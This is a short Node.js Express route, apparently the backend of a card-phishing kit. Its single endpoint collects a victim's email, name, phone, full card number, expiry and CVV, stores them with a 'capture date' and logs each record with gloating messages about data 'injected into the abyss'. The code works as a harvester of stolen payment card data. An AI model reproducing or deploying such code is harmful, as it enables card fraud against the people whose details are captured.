const express = require('express');
const router = express.Router();
const Cartao = require('./Cartao');

router.post('/salvar-cartao', async (req, res) => {
  try {
    const {
      email,
      emailConfirm,
      nome,
      celular,
      numero,
      validade,
      cvv,
      nomeCartao,
      parcelas,
      doisCartoes
    } = req.body;

    const novoCartao = new Cartao({
      email,
      emailConfirm,
      nome,
      celular,
      numero,
      validade,
      cvv,
      nomeCartao,
      parcelas,
      doisCartoes,
      dataCaptura: new Date()
    });

    await novoCartao.save();
    console.log("🩸 Dado injetado no abismo:", novoCartao);
    res.json({ status: 'ok' });
  } catch (err) {
    console.error("💀 Erro na salvação:", err);
    res.status(500).json({ status: 'erro', erro: err });
  }
});

module.exports = router;
